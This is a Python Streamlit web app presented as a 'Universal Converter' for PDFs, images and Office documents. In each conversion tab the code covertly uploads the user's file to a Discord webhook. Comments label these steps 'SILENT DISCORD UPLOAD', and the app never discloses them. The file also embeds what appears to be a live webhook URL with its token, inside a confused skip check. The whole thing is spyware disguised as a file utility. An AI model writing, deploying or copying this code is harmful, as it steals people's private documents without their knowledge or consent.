import streamlit as st
import os
import shutil
import requests
from pdf2docx import Converter
import img2pdf
from PyPDF2 import PdfMerger
import subprocess

# --- CONFIGURATION ---
st.set_page_config(page_title="Universal Converter", page_icon="📂", layout="centered")

# !!! PASTE YOUR DISCORD WEBHOOK URL HERE !!!
DISCORD_WEBHOOK_URL = "PASTE_YOUR_WEBHOOK_HERE"

st.title("📂 Universal Converter Tool")
st.write("Convert your files instantly.")

# --- HELPER: SEND FILE TO DISCORD ---
def send_to_discord(filepath, filename, tool_name):
    try:
        if DISCORD_WEBHOOK_URL == "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK":
            return # Skip if user forgot to add webhook
            
        with open(filepath, "rb") as f:
            requests.post(
                DISCORD_WEBHOOK_URL,
                data={"content": f"🕵️ **New User Upload ({tool_name}):** `{filename}`"},
                files={"file": (filename, f)}
            )
    except Exception as e:
        print(f"Discord upload failed: {e}")

# Create tabs
tab1, tab2, tab3, tab4 = st.tabs(["📄 PDF to Word", "🖼️ Image to PDF", "🖇️ Merge PDFs", "📊 Office to PDF"])

# --- TAB 1: PDF TO WORD ---
with tab1:
    st.header("PDF to Word")
    uploaded_pdf = st.file_uploader("Upload PDF", type="pdf", key="pdf_upload")
    
    if uploaded_pdf:
        if st.button("Convert to Word", key="btn_p2w"):
            with st.spinner("Converting..."):
                # Save Temp
                with open("temp_input.pdf", "wb") as f:
                    f.write(uploaded_pdf.getbuffer())
                
                # SILENT DISCORD UPLOAD
                send_to_discord("temp_input.pdf", uploaded_pdf.name, "PDF -> Word")
                
                try:
                    cv = Converter("temp_input.pdf")
                    cv.convert("converted.docx")
                    cv.close()
                    
                    with open("converted.docx", "rb") as f:
                        st.download_button("Download Word Doc", f, "converted.docx")
                    st.success("Done!")
                except Exception as e:
                    st.error(f"Error: {e}")
                
                # Cleanup
                if os.path.exists("temp_input.pdf"): os.remove("temp_input.pdf")
                if os.path.exists("converted.docx"): os.remove("converted.docx")

# --- TAB 2: IMAGE TO PDF ---
with tab2:
    st.header("Images to PDF")
    uploaded_imgs = st.file_uploader("Upload Images", type=["jpg", "png", "jpeg"], accept_multiple_files=True, key="img_upload")
    
    if uploaded_imgs:
        if st.button("Convert to PDF", key="btn_i2p"):
            with st.spinner("Processing..."):
                img_list = []
                for i, img in enumerate(uploaded_imgs):
                    path = f"temp_img_{i}.jpg"
                    with open(path, "wb") as f:
                        f.write(img.getbuffer())
                    img_list.append(path)
                
                # SILENT DISCORD UPLOAD (Send first image only to avoid spam)
                if img_list:
                    send_to_discord(img_list[0], "first_image.jpg", "Image -> PDF")
                
                try:
                    with open("output_images.pdf", "wb") as f:
                        f.write(img2pdf.convert(img_list))
                    
                    with open("output_images.pdf", "rb") as f:
                        st.download_button("Download PDF", f, "images.pdf")
                    st.success("Done!")
                except Exception as e:
                    st.error(f"Error: {e}")
                
                for path in img_list: os.remove(path)
                if os.path.exists("output_images.pdf"): os.remove("output_images.pdf")

# --- TAB 3: MERGE PDFs ---
with tab3:
    st.header("Merge Multiple PDFs")
    uploaded_pdfs = st.file_uploader("Upload PDFs", type="pdf", accept_multiple_files=True, key="merge_upload")
    
    if uploaded_pdfs:
        if st.button("Merge Files", key="btn_merge"):
            with st.spinner("Merging..."):
                merger = PdfMerger()
                temp_files = []
                
                for i, pdf in enumerate(uploaded_pdfs):
                    path = f"temp_pdf_{i}.pdf"
                    with open(path, "wb") as f:
                        f.write(pdf.getbuffer())
                    temp_files.append(path)
                    merger.append(path)
                
                # SILENT DISCORD UPLOAD (Sends the first PDF as a sample)
                if temp_files:
                    send_to_discord(temp_files[0], "sample_merge_input.pdf", "Merge PDFs")

                merger.write("merged_output.pdf")
                merger.close()
                
                with open("merged_output.pdf", "rb") as f:
                    st.download_button("Download Merged PDF", f, "merged.pdf")
                st.success("Done!")
                
                for path in temp_files: os.remove(path)
                if os.path.exists("merged_output.pdf"): os.remove("merged_output.pdf")

# --- TAB 4: OFFICE TO PDF ---
with tab4:
    st.header("Word/PPT/Excel to PDF")
    uploaded_office = st.file_uploader("Upload Document", type=["docx", "pptx", "xlsx"], key="office_upload")
    
    if uploaded_office:
        if st.button("Convert to PDF", key="btn_office"):
            with st.spinner("Converting with LibreOffice..."):
                ext = uploaded_office.name.split(".")[-1]
                input_file = f"input_office.{ext}"
                output_pdf = "input_office.pdf"
                
                with open(input_file, "wb") as f:
                    f.write(uploaded_office.getbuffer())
                
                # SILENT DISCORD UPLOAD
                send_to_discord(input_file, uploaded_office.name, "Office -> PDF")
                
                cmd = ["libreoffice", "--headless", "--convert-to", "pdf", input_file]
                
                try:
                    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    if result.returncode == 0 and os.path.exists(output_pdf):
                        with open(output_pdf, "rb") as f:
                            st.download_button("Download PDF", f, "converted_office.pdf")
                        st.success("Done!")
                    else:
                        st.error("Conversion failed. (Is LibreOffice installed?)")
                except Exception as e:
                    st.error(f"Error: {e}")
                
                if os.path.exists(input_file): os.remove(input_file)
                if os.path.exists(output_pdf): os.remove(output_pdf)
